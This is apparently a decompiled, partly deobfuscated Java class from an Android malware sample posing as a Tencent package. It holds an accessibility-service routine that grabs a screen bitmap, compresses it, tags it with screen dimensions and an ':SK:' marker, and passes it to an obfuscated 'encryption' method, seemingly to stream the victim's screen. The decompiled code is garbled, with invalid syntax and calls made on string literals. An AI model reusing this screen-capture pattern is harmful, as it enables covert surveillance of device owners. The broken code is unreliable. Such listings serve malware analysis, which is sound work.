package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_8_1
 * Original: Lcom/tencent/tunesxconcerningn1012$8$1;
 */
class AccessibilityServiceCore_8_1 implements Runnable; {

    // === FIELDS ===
    final AccessibilityServiceCore$8 this$1;
    final Bitmap val$Sc_bitmap;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore$8 param0, Bitmap param1) {
        v0.this$1 = v1;
        v0.val$Sc_bitmap = v2;
        // new Object()
        return;
    }

    public void run() {
        v0 = ":";
        v1 = new ByteArrayOutputStream();
        // new ByteArrayOutputStream()
        v2 = v6.val$Sc_bitmap;
        v4 = v2.getWidth();
        v4 = v6.val$Sc_bitmap;
        v5 = v4.getHeight();
        v5 = 0;
        v3 = Bitmap.createBitmap(v2, 0, 0, v3, v4);
        v3 = 48;
        v4 = AccessibilityServiceCore.getTransparentBitmap(v2, 48);
        v4 = 20;
        v2.compress(48, 20, v1);
        v2 = v1.toByteArray();
        v2 = v6.this$1;
        v2 = v2.this$0;
        v2.getApplicationContext();
        My_tunesxconcerningn10_Settings.read(v2, "SCH", "720");
        "SCH".getApplicationContext();
        My_tunesxconcerningn10_Settings.read("SCH", "SCW", "1080");
        // new StringBuilder()
        "SCW".append("1080");
        "SCW".append(":");
        "SCW".append("SCH");
        "SCW".append(":");
        "SCW".append(v2);
        "SCW".append(":");
        "SCW".append(":");
        "SCW".append(":SK:");
        "SCW".toString();
        DataEncryptionEngine.agreeltimelybfacilitatez38(":SK:", v1);
        // goto (branch)
        ":SK:".printStackTrace();
        return;
    }
}
